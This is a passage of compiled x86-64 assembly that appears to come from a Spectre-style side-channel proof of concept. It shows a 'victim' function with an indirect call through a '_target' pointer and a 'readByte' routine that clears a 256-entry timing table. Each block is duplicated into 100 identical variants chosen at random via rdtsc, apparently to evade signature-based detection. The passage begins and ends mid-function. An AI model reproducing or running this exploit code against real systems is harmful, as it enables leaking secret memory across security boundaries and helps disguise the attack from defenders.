	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 76
.Lvictim_win0_var76:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 77
.Lvictim_win0_var77:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 78
.Lvictim_win0_var78:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 79
.Lvictim_win0_var79:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 80
.Lvictim_win0_var80:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 81
.Lvictim_win0_var81:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 82
.Lvictim_win0_var82:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 83
.Lvictim_win0_var83:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 84
.Lvictim_win0_var84:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 85
.Lvictim_win0_var85:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 86
.Lvictim_win0_var86:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 87
.Lvictim_win0_var87:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 88
.Lvictim_win0_var88:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 89
.Lvictim_win0_var89:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 90
.Lvictim_win0_var90:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 91
.Lvictim_win0_var91:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 92
.Lvictim_win0_var92:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 93
.Lvictim_win0_var93:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 94
.Lvictim_win0_var94:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 95
.Lvictim_win0_var95:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 96
.Lvictim_win0_var96:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 97
.Lvictim_win0_var97:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 98
.Lvictim_win0_var98:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 99
.Lvictim_win0_var99:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
.Lvictim_win0_continue:
	movl	%eax, %ebx
	## InlineAsm End
	movl	%ebx, -36(%rbp)    # # 4-byte Spill
	movl	-36(%rbp), %eax    # # 4-byte Reload
	movl	%eax, -32(%rbp)
	movl	-32(%rbp), %eax
	andl	-24(%rbp), %eax
	popq	%rbx
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readByte                       ## -- Begin function readByte
	.p2align	4, 0x90
_readByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1120, %rsp    # # imm = 0x460
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movq	%rdi, -1048(%rbp)
	movq	%rsi, -1056(%rbp)
	movq	%rdx, -1064(%rbp)
	movl	$0, -1088(%rbp)
	movb	$36, -1113(%rbp)
	movl	$0, -1072(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win8_var0
	cmpl	$1, %eax
	je	.LreadByte_win8_var1
	cmpl	$2, %eax
	je	.LreadByte_win8_var2
	cmpl	$3, %eax
	je	.LreadByte_win8_var3
	cmpl	$4, %eax
	je	.LreadByte_win8_var4
	cmpl	$5, %eax
	je	.LreadByte_win8_var5
	cmpl	$6, %eax
	je	.LreadByte_win8_var6
	cmpl	$7, %eax
	je	.LreadByte_win8_var7
	cmpl	$8, %eax
	je	.LreadByte_win8_var8
	cmpl	$9, %eax
	je	.LreadByte_win8_var9
	cmpl	$10, %eax
	je	.LreadByte_win8_var10
	cmpl	$11, %eax
	je	.LreadByte_win8_var11
	cmpl	$12, %eax
	je	.LreadByte_win8_var12
	cmpl	$13, %eax
	je	.LreadByte_win8_var13
	cmpl	$14, %eax
	je	.LreadByte_win8_var14
	cmpl	$15, %eax
	je	.LreadByte_win8_var15
	cmpl	$16, %eax
	je	.LreadByte_win8_var16
	cmpl	$17, %eax
	je	.LreadByte_win8_var17
	cmpl	$18, %eax
	je	.LreadByte_win8_var18
	cmpl	$19, %eax
	je	.LreadByte_win8_var19
	cmpl	$20, %eax
	je	.LreadByte_win8_var20
	cmpl	$21, %eax
	je	.LreadByte_win8_var21
	cmpl	$22, %eax
	je	.LreadByte_win8_var22
	cmpl	$23, %eax
	je	.LreadByte_win8_var23
	cmpl	$24, %eax
	je	.LreadByte_win8_var24
	cmpl	$25, %eax
	je	.LreadByte_win8_var25
	cmpl	$26, %eax
	je	.LreadByte_win8_var26
	cmpl	$27, %eax
	je	.LreadByte_win8_var27
	cmpl	$28, %eax
	je	.LreadByte_win8_var28
	cmpl	$29, %eax
	je	.LreadByte_win8_var29
	cmpl	$30, %eax
	je	.LreadByte_win8_var30
	cmpl	$31, %eax
	je	.LreadByte_win8_var31
	cmpl	$32, %eax
	je	.LreadByte_win8_var32
	cmpl	$33, %eax
	je	.LreadByte_win8_var33
	cmpl	$34, %eax
	je	.LreadByte_win8_var34
	cmpl	$35, %eax
	je	.LreadByte_win8_var35
	cmpl	$36, %eax
	je	.LreadByte_win8_var36
	cmpl	$37, %eax
	je	.LreadByte_win8_var37
	cmpl	$38, %eax
	je	.LreadByte_win8_var38
	cmpl	$39, %eax
	je	.LreadByte_win8_var39
	cmpl	$40, %eax
	je	.LreadByte_win8_var40
	cmpl	$41, %eax
	je	.LreadByte_win8_var41
	cmpl	$42, %eax
	je	.LreadByte_win8_var42
	cmpl	$43, %eax
	je	.LreadByte_win8_var43
	cmpl	$44, %eax
	je	.LreadByte_win8_var44
	cmpl	$45, %eax
	je	.LreadByte_win8_var45
	cmpl	$46, %eax
	je	.LreadByte_win8_var46
	cmpl	$47, %eax
	je	.LreadByte_win8_var47
	cmpl	$48, %eax
	je	.LreadByte_win8_var48
	cmpl	$49, %eax
	je	.LreadByte_win8_var49
	cmpl	$50, %eax
	je	.LreadByte_win8_var50
	cmpl	$51, %eax
	je	.LreadByte_win8_var51
	cmpl	$52, %eax
	je	.LreadByte_win8_var52
	cmpl	$53, %eax
	je	.LreadByte_win8_var53
	cmpl	$54, %eax
	je	.LreadByte_win8_var54
	cmpl	$55, %eax
	je	.LreadByte_win8_var55
	cmpl	$56, %eax
	je	.LreadByte_win8_var56
	cmpl	$57, %eax
	je	.LreadByte_win8_var57
	cmpl	$58, %eax
	je	.LreadByte_win8_var58
	cmpl	$59, %eax
	je	.LreadByte_win8_var59
	cmpl	$60, %eax
	je	.LreadByte_win8_var60
	cmpl	$61, %eax
	je	.LreadByte_win8_var61
	cmpl	$62, %eax
	je	.LreadByte_win8_var62
	cmpl	$63, %eax
	je	.LreadByte_win8_var63
	cmpl	$64, %eax
	je	.LreadByte_win8_var64
	cmpl	$65, %eax
	je	.LreadByte_win8_var65
	cmpl	$66, %eax
	je	.LreadByte_win8_var66
	cmpl	$67, %eax
	je	.LreadByte_win8_var67
	cmpl	$68, %eax
	je	.LreadByte_win8_var68
	cmpl	$69, %eax
	je	.LreadByte_win8_var69
	cmpl	$70, %eax
	je	.LreadByte_win8_var70
	cmpl	$71, %eax
	je	.LreadByte_win8_var71
	cmpl	$72, %eax
	je	.LreadByte_win8_var72
	cmpl	$73, %eax
	je	.LreadByte_win8_var73
	cmpl	$74, %eax
	je	.LreadByte_win8_var74
	cmpl	$75, %eax
	je	.LreadByte_win8_var75
	cmpl	$76, %eax
	je	.LreadByte_win8_var76
	cmpl	$77, %eax
	je	.LreadByte_win8_var77
	cmpl	$78, %eax
	je	.LreadByte_win8_var78
	cmpl	$79, %eax
	je	.LreadByte_win8_var79
	cmpl	$80, %eax
	je	.LreadByte_win8_var80
	cmpl	$81, %eax
	je	.LreadByte_win8_var81
	cmpl	$82, %eax
	je	.LreadByte_win8_var82
	cmpl	$83, %eax
	je	.LreadByte_win8_var83
	cmpl	$84, %eax
	je	.LreadByte_win8_var84
	cmpl	$85, %eax
	je	.LreadByte_win8_var85
	cmpl	$86, %eax
	je	.LreadByte_win8_var86
	cmpl	$87, %eax
	je	.LreadByte_win8_var87
	cmpl	$88, %eax
	je	.LreadByte_win8_var88
	cmpl	$89, %eax
	je	.LreadByte_win8_var89
	cmpl	$90, %eax
	je	.LreadByte_win8_var90
	cmpl	$91, %eax
	je	.LreadByte_win8_var91
	cmpl	$92, %eax
	je	.LreadByte_win8_var92
	cmpl	$93, %eax
	je	.LreadByte_win8_var93
	cmpl	$94, %eax
	je	.LreadByte_win8_var94
	cmpl	$95, %eax
	je	.LreadByte_win8_var95
	cmpl	$96, %eax
	je	.LreadByte_win8_var96
	cmpl	$97, %eax
	je	.LreadByte_win8_var97
	cmpl	$98, %eax
	je	.LreadByte_win8_var98
	cmpl	$99, %eax
	je	.LreadByte_win8_var99
	jmp	.LreadByte_win8_var0
## Variant 0
.LreadByte_win8_var0:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 1
.LreadByte_win8_var1:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 2
.LreadByte_win8_var2:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 3
.LreadByte_win8_var3:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 4
.LreadByte_win8_var4:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 5
.LreadByte_win8_var5:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 6
.LreadByte_win8_var6:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 7
.LreadByte_win8_var7:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 8
.LreadByte_win8_var8:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 9
.LreadByte_win8_var9:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 10
.LreadByte_win8_var10:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 11
.LreadByte_win8_var11:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 12
.LreadByte_win8_var12:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 13
.LreadByte_win8_var13:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 14
.LreadByte_win8_var14:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 15
.LreadByte_win8_var15:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 16
.LreadByte_win8_var16:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 17
.LreadByte_win8_var17:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 18
.LreadByte_win8_var18:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 19
.LreadByte_win8_var19:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 20
.LreadByte_win8_var20:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 21
.LreadByte_win8_var21:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 22
.LreadByte_win8_var22:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 23
.LreadByte_win8_var23:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 24
.LreadByte_win8_var24:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 25
.LreadByte_win8_var25:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 26
.LreadByte_win8_var26:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 27
.LreadByte_win8_var27:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 28
.LreadByte_win8_var28:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 29
.LreadByte_win8_var29:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 30
.LreadByte_win8_var30:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 31
.LreadByte_win8_var31:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 32
.LreadByte_win8_var32:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 33
.LreadByte_win8_var33:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 34
.LreadByte_win8_var34:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 35
.LreadByte_win8_var35:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 36
.LreadByte_win8_var36:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 37
.LreadByte_win8_var37:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 38
.LreadByte_win8_var38:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 39
.LreadByte_win8_var39:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 40
.LreadByte_win8_var40:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 41
.LreadByte_win8_var41:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 42
.LreadByte_win8_var42:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 43
.LreadByte_win8_var43:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 44
.LreadByte_win8_var44:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 45
.LreadByte_win8_var45:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 46
.LreadByte_win8_var46:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 47
.LreadByte_win8_var47:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 48
.LreadByte_win8_var48:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 49
.LreadByte_win8_var49:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 50
.LreadByte_win8_var50:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 51
.LreadByte_win8_var51:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 52
.LreadByte_win8_var52:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 53
.LreadByte_win8_var53:
	popq	%rax
